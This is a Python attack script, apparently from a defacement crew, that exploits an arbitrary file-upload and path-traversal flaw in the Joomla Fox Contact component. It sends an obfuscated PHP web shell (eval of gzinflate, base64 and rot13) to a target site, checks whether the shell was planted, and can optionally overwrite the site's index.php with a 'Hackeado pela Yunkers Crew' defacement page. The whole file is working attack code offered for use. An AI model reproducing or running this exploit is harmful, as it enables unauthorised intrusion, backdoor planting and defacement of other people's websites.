import colorama # pip3 install colorama
from colorama import Fore as F
import requests as r # pip3 install requests
import argparse as arg
import os as sistema
sistema.system('cls' if sistema.name == 'nt' else 'reset')
index = r"""
________________________________________________________

 ________  _______   ___       ___       ___     ___    ___ 
|\_____  \|\  ___ \ |\  \     |\  \     |\  \   |\  \  /  /|
 \|___/  /\ \   __/|\ \  \    \ \  \    \ \  \  \ \  \/  / /
     /  / /\ \  \_|/_\ \  \    \ \  \    \ \  \  \ \    / / 
    /  /_/__\ \  \_|\ \ \  \____\ \  \____\ \  \  /     \/  
   |\________\ \_______\ \_______\ \_______\ \__\/  /\   \  
    \|_______|\|_______|\|_______|\|_______|\|__/__/ /\ __\ 
                                                |__|/ \|__|

 								
Script: Zellix
Github: https://github.com/Zellix67?tab=repositories
________________________________________________________
"""
def arruma(url):
	if url[-1] != "/":
		url = url + "/"
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url
user_agent = {'User-agent': 'Mozilla/5.0'}
parser = arg.ArgumentParser(description = "Exploit by Zellix")

parser.add_argument("--url", action='store', help = "Site Link", required = True)
parser.add_argument("--cid", action='store',  help = "Item ID number", required = True)
parser.add_argument("--bypass", action='store_true', help = "Change the cid to 0 and in the middle for the inserted cid")
parser.add_argument("--index", action='store_true', help = "invade index")
parser.add_argument("--threads", action='store', type = int, default = "10", help = "Time for each request.")
param = parser.parse_args()

print(F.GREEN + index)
print(F.GREEN + "[+] Site:" + F.WHITE + "", param.url)
print(F.GREEN + "[+] ID:" + F.WHITE + "", param.cid)
if param.bypass:
	cid_bypass = "0"
else:
	cid_bypass = param.cid
joomla_diretorios = ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_zellix.php".format(cid_bypass, param.cid), "index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_zellix.php".format(param.cid, cid_bypass, param.cid), "index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_fire.php".format(param.cid, cid_bypass, param.cid, param.cid), "components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_zellix.php".format(cid_bypass, param.cid)]
shell = r"""<center>
<h5>File Upload here</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>
</center>"""
diretorios = 0
if param.index:
	joomla_diretorios = [letra.replace("/../../_zellix.php", "/../../../../index.php") for letra in joomla_diretorios]
	shell = """

<html>
<head>
	<meta charset="utf-8">
	<title>./yc.py</title>
	<link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
</head>
<body bgcolor="white">

	<center><font size="5" face="Lato" color="black">Hackeado pela</font></center>
	<center><font size="10" face="Lato" color="black">Yunkers Crew</font></center>
	<center><font size="3" face="Lato" color="black">Supr3m0 passou aqui :/</font></center>
	<center><font size="3" face="Lato" color="black">Nois ta de volta, pra alegria dos hater haha</font></center>

	<center><img src="http://cdn5.colorir.com/desenhos/pintar/fantasma-classico_2.png" alt="Smiley face" height="250" width="400"></center>

	<center><font size="4" face="Lato" color="black">Somos: Supr3m0, W4r1o6k, V4por, F1r3Bl00d, Pr0sex & Cooldsec</font></center>
	<center><font size="4" face="Lato" color="black">Salve: Xin0x, R41d, Junin, M0nst4r & CryptonKing, Jonas sz</font></center>
	</br>
	<center><font size="5" face="Lato" color="black"><u>https://github.com/Zellix67</u></font></center>
</body>
</html>
	"""

url = arruma(param.url)
try:
	for diretorio in joomla_diretorios:
		diretorios += 1
		url_vuln = url + diretorio
		shell_dir = url + "components/com_foxcontact/_zellix.php"
		checa_site = r.get(url_vuln, headers=user_agent)
		if '{"' in checa_site.text:
			print(F.GREEN + "\n[!] " + F.WHITE + " Inserting payload in the directory {}...".format(diretorios))
			envia_shell = r.post(url_vuln, data=shell, headers=user_agent)
			print(F.YELLOW + "[!] "+ F.WHITE + "Answered:")
			print(F.CYAN + envia_shell.text)
			verifica_shell = r.get(shell_dir, headers=user_agent)
			if verifica_shell.status_code != 404:
				print(F.GREEN + "\n[*]" + F.WHITE + " Shell successfully sent!")
				print(F.GREEN + "[+]" + F.WHITE + " Shell location: "+shell_dir)
				input("Press enter to continue")
			else:
				print(F.RED + "[-] "+ F.WHITE + " I didn't find the shell: ", shell_dir)
		else:
			print(F.RED + "\n[-] " + F.WHITE + " Non-vulnerable directory: {}.".format(diretorios))
except Exception as iu:
	print(iu)
print(F.WHITE + "")
